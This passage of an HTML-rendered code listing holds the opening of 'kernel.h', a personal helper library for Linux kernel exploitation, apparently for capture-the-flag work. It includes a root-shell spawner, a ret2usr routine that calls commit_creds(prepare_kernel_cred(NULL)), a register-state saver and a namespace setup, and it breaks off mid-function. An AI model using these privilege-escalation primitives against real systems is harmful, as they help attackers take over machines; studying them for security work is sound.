class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @file kernel.h</span></span><br><span class="line"><span class="comment"> * @author arttnba3 (arttnba@gmail.com)</span></span><br><span class="line"><span class="comment"> * @brief arttnba3&#x27;s personal utils for kernel pwn</span></span><br><span class="line"><span class="comment"> * @version 1.1</span></span><br><span class="line"><span class="comment"> * @date 2023-05-20</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @copyright Copyright (c) 2023 arttnba3</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> A3_KERNEL_PWN_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A3_KERNEL_PWN_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * I - fundamental functions</span></span><br><span class="line"><span class="comment"> * e.g. CPU-core binder, user-status saver, etc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> kernel_base = <span class="number">0xffffffff81000000</span>, kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> page_offset_base = <span class="number">0xffff888000000000</span>, vmemmap_base = <span class="number">0xffffea0000000000</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> init_task, init_nsproxy, init_cred;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">direct_map_addr_to_page_addr</span><span class="params">(<span class="keyword">size_t</span> direct_map_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> page_count;</span><br><span class="line"></span><br><span class="line">    page_count = ((direct_map_addr &amp; (~<span class="number">0xfff</span>)) - page_offset_base) / <span class="number">0x1000</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> vmemmap_base + page_count * <span class="number">0x40</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">void</span> *p, <span class="keyword">int</span> size)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(size % <span class="keyword">sizeof</span>(<span class="keyword">void</span> *))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i += <span class="keyword">sizeof</span>(<span class="keyword">void</span> *))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%04x :  %02X %02X %02X %02X %02X %02X %02X %02X     0x%lx\n&quot;</span>, </span><br><span class="line">                i, buf[i+<span class="number">0</span>], buf[i+<span class="number">1</span>], buf[i+<span class="number">2</span>], buf[i+<span class="number">3</span>], buf[i+<span class="number">4</span>], buf[i+<span class="number">5</span>], buf[i+<span class="number">6</span>], buf[i+<span class="number">7</span>], *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">err_exit</span><span class="params">(<span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* root checker and shell poper */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root_shell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Checking for root...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(getuid()) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* to exit the process normally, instead of segmentation fault */</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* userspace status saver */</span></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;pushf;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bind_core</span><span class="params">(<span class="keyword">int</span> core)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* for ret2usr attacker */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root_privilige</span><span class="params">(<span class="keyword">size_t</span> prepare_kernel_cred, <span class="keyword">size_t</span> commit_creds)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *(*prepare_kernel_cred_ptr)(<span class="keyword">void</span> *) = </span><br><span class="line">                                         (<span class="keyword">void</span> *(*)(<span class="keyword">void</span>*)) prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">int</span> (*commit_creds_ptr)(<span class="keyword">void</span> *) = (<span class="keyword">int</span> (*)(<span class="keyword">void</span>*)) commit_creds;</span><br><span class="line">    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief create an isolate namespace</span></span><br><span class="line"><span class="comment"> * note that the caller **SHOULD NOT** be used to get the root, but an operator</span></span><br><span class="line"><span class="comment"> * to perform basic exploiting operations in it only</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unshare_setup</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">int</span> tmp_fd;</span><br><span class="line"></span><br><span class="line">    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">    write(tmp_fd, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getuid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getgid());</span><br><span class="line">    